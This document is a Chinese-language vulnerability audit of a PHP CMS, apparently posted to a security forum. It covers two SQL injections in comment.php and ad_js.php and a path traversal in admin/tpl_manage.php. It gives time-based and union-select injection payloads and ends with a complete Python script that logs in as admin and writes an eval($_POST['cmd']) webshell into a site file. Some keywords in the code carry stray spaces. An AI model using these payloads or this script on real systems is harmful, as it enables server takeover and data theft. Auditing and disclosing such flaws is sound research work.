源码地址  
<http://down.chinaz.com/soft/26181.htm>  
一、审计工具  
Seay源代码审计系统,phpstrom2020.1.3  
二、审计步骤  
1.利用Seay自动审计功能查到很多问题，包括sql注入,文件包含，文件上传等代码逐一进行分析  
sql注入1  
1.通过审计发现comment.php存在sql语句变量未过滤，跟进代码进行分析查看，发现包含了配置文件，分析配置文件，发现对$GET,$POST,$REQUEST,$COOKIE都进行了过滤，像是'这种闭合就不考虑了,但是对$SERVER并未进行过滤  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-6ec61a56e3cf605eb8a51adad4142f3aa064e980.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-6ec61a56e3cf605eb8a51adad4142f3aa064e980.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f16545fcfcee8780f543c0f01f9a46bd575595ad.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f16545fcfcee8780f543c0f01f9a46bd575595ad.png)  
2.在uploads/comment.php下有插入变量$ip属于server变量且并未进行过滤，由此判断此处为注入点。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2217b0b50de5c6628e667da91f9aafe7fa29dfdf.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2217b0b50de5c6628e667da91f9aafe7fa29dfdf.png)

```php
function getip()
{
   if (getenv('HTTP_CLIENT_IP'))
   {
      $ip = getenv('HTTP_CLIENT_IP'); 
   }
   elseif (getenv('HTTP_X_FORWARDED_FOR')) 
   { //��ȡ�ͻ����ô������������ʱ����ʵip ��ַ
      $ip = getenv('HTTP_X_FORWARDED_FOR');
   }
   elseif (getenv('HTTP_X_FORWARDED')) 
   { 
      $ip = getenv('HTTP_X_FORWARDED');
   }
   elseif (getenv('HTTP_FORWARDED_FOR'))
   {
      $ip = getenv('HTTP_FORWARDED_FOR'); 
   }
   elseif (getenv('HTTP_FORWARDED'))
   {
      $ip = getenv('HTTP_FORWARDED');
   }
   else
   { 
      $ip = $_SERVER['REMOTE_ADDR'];
   }
   return $ip;
}
```

SQL注入2  
1.查看一处可能有sql注入漏洞的地方,uploads/ad\_js.php处，发现虽然也时对$GET进行了‘转义,但是sql语句中并不需要闭合'，很明显，这里的sql语句查询为WHERE ad\_id=1111这种可以直接进行注入攻击。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f345cfac5ab9374bf9a98bca0c1a78b56d0f93d8.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f345cfac5ab9374bf9a98bca0c1a78b56d0f93d8.png)

任意文件读取+getshell  
1.跟进代码uploads/admin/tpl\_manage.php,当传入act=edit编辑模板时，可以直接根据传入参数../ 目录穿越到user.php，ann.php等模板文件里，并进行编辑写入,且无任何过滤限制。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1443a4be0394aee3a3dc7a06737a71484c8d49c3.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1443a4be0394aee3a3dc7a06737a71484c8d49c3.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9be8bbf813c88cd917cfa4004d244fb7db17cc1a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9be8bbf813c88cd917cfa4004d244fb7db17cc1a.png)

三、漏洞复现  
sql注入1  
可以看到sql语句已经显示出来，可以用延时注入进行sql注入,paylaod:1’ and sleep(20) and '1'='1  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c1a69fc01906a4b02b0a034e02b9b1ad2142ca31.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c1a69fc01906a4b02b0a034e02b9b1ad2142ca31.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a0579ce0e2099b5ef8ec5d6c917a5956a4138ba8.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a0579ce0e2099b5ef8ec5d6c917a5956a4138ba8.png)

sql注入2  
使用联合注入可以注入出来,payload:1 union select 1,2,3,4,5,6,(select datab ase())  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-901e016d5f27529062ecbb97df2e702d305bfbba.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-901e016d5f27529062ecbb97df2e702d305bfbba.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-720dab22aefef80b43cb54980def74dc01534d99.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-720dab22aefef80b43cb54980def74dc01534d99.png)

任意文件读取写入+getshell  
需要进到管理员后台，进行模板编辑功能，随意编辑一个模板，进入查看网页源代码，找到tpl\_manage.php地址进行访问,进行目录穿越随意修改一个info.php模板信息，添加payload:&lt;?php phpinfo(); ?&gt;访问uploads/info.php复现成功。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-035b0a890605e22d9c80d4d9844e0b8320fb7d66.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-035b0a890605e22d9c80d4d9844e0b8320fb7d66.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ccb8e5a69f78f4df76c421588ff8eef0698efc67.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ccb8e5a69f78f4df76c421588ff8eef0698efc67.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7e3f94cd981af1c94f0b1108dd5440b4b33c7447.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7e3f94cd981af1c94f0b1108dd5440b4b33c7447.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-fe6e59fb99820e26f74a2109a85f5db962c7aecf.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-fe6e59fb99820e26f74a2109a85f5db962c7aecf.png)  
四、利用模板编辑漏洞编写一键Getshell脚本  
1.代码如下

```python
#author: soufaker
#time: 2021/7/23

import requests
import optparse
from lx ml import etree

#参数设置
parser = optparse.OptionParser()
parser.add_option('-u','--url',action='store',dest="url")
parser.add_option('-a','--username',action='store',dest="username")
parser.add_option('-p','--password',action='store',dest="password")
options,args = parser.parse_args()

#参数获取
url = options.url
username = options.username
password = options.password

#登录数据获取
login_data = {"admin_name":username,"admin_pwd":password,"submit":"登录","act":"do_login"}
login_url = url + "/admin/login.php?act=login"
shell_url = url + "/admin/tpl_manage.php?act=edit&tpl_name=../../ad_js.php"

#payload(可自行更改)
shell_payload= "<?php @e val($_POST['cmd']) ?>"

#获取登录cookie
session = requests.Session()
r = session.post(login_url,login_data,allow_redirects=False)
cookie = r.headers["Set-Cookie"]

#设置具有admin会话的headers
headers = {"Cookie":cookie,"Content-Type":'application/x-www-form-urlencoded'}

#获取修改模板原有的内容
r2 = requests.get(shell_url,allow_redirects=False, headers=headers)
html = etree.HTML(r2.content)

#设置修改编辑内容容器的xpth路径
select_xpath = '//textarea/text()'

#获取容器对象
tpl_content = str(html.xpath(select_xpath))

#拼接模板原有内容和payload构成最后要传入模板的内容
last_p=str(tpl_content+shell_payload)

#根据传入参数设置对应值，这里随意找一个网站模板../../ann.php，也可以修改为其他模板
data2 = {"tpl_content":last_p,"tpl_name":"../../ad_js.php","act":"do_edit"}

#设置代理,方便本地抓包查看
proxies = {"http": "http://localhost:8080"}

#提交数据
post = session.post(shell_url, data=data2,allow_redirects=False, headers=headers,proxies=proxies)

#根据返回状态判断是否getshell成功
if post.status_code == 200:
    shell_url2 = url+'/ad_js.php'
    print("成功getshell!,shell地址为:%s,密码为:cmd"%shell_url2)
else:
    print("getshell失败!请检查cms版本是否存在该漏洞!")

```

2.脚本使用复现  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4fb755385b8ff9d3ce79a86a0c88c6d6c11d57a7.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4fb755385b8ff9d3ce79a86a0c88c6d6c11d57a7.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-317c6f9518156d67ad3fa16d2c22b657592d2acc.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-317c6f9518156d67ad3fa16d2c22b657592d2acc.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ff4e8989bce7cd85da5931b24322a935e6505571.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ff4e8989bce7cd85da5931b24322a935e6505571.png)